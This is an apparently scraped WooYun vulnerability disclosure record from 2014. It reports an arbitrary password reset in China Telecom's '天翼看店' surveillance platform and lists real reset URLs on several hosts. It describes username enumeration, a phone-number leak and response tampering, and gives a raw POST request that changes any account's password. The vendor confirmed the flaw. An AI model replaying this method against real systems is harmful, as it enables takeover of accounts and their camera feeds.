{"id": 48179, "wybug_id": "wooyun-2014-078424", "wybug_title": "中国电信某系统集成服务提供商通用安防业务任意密码重置（或可偷窥？）", "wybug_corp": "189.cn", "wybug_author": "魇", "wybug_date": "2014-10-06 00:08", "wybug_open_date": "2015-01-04 00:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向公众公开  简要描述： 信不信？ 详细说明：  http://www.jsict.com/ 江苏鸿信系统集成有限公司\n\n产品：天翼看店天翼看店是江苏鸿信系统集成有限公司推出的一款集摄像、录像、实时监控、云台控制、报警、存储为一体安防业务，针对公司、店铺等需要进行可视化管理的场所，通过客户端管理软件和互联网服务平台，以电脑和智能手机作为媒介，实现远程监控，帮助用户更好地进行安防和可视化管理。列举案例：\nhttp://www.pinganyun.cn:8000/jsp/findPassword/findPasswordSetp1.actionhttp://ha.kandian.189.cn:8000/jsp/findPassword/findPasswordSetp1.actionhttp://www.189eyes.com:8000/jsp/findPassword/findPasswordSetp1.actionhttp://sjkd.online.cq.cn:8000/jsp/findPassword/findPasswordSetp1.action\n   漏洞证明：  首先我们来看http://ha.kandian.189.cn:8000北京 江苏 天津 湖南 河南 山西 新疆 鞍山 8个区域都在使用\n\nhttp://ha.kandian.189.cn:8000/jsp/findPassword/findPasswordSetp1.action 找回密码处仍旧可以枚举用户名，这里以找回\"fan\"为例\n\n设计小缺陷，此处泄露用户手机\n\n修改响应为true\n\n\n\n\n\nfan:wooyuntest1 登录验证是否修改成功，登录上去之后，啥玩意..政企中心 真的假的 吓谁呢..\n\n还有第二处任意密码修改\nPOST /jsp/findPassword/savePassword.action HTTP/1.1Host: ha.kandian.189.cn:8000Proxy-Connection: keep-aliveContent-Length: 60Accept: */*Origin: http://ha.kandian.189.cn:8000X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://ha.kandian.189.cn:8000/jsp/findPassword/findPasswordSetp3.actionAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: userId=4ae6eca743574c98014366b5258d0d17&password=wooyuntest1\n这里也只要获取到userId参数就可以修改任意账户密码，在第一步找回密码处可以获取到\n\n然后构造Post直接改密就可以了。平安云，测试了下方法是通用的：\n\n至于我为什么觉得是通用呢，首先http://sjkd.online.cq.cn:8000跟http://ha.kandian.189.cn:8000 经过测试用户不通用，online.cq.cn百度了下是重庆热线，版权是电信的重庆分公司 http://www.pinganyun.cn:8000 平安云就不知道了 反正用户也不通用\n\n   修复方案：  \n\n\n\n\n\n   版权声明：转载请注明来源 魇@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-10-11 16:02 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-06 00:24 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  我的天 电信哭晕在厕所    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}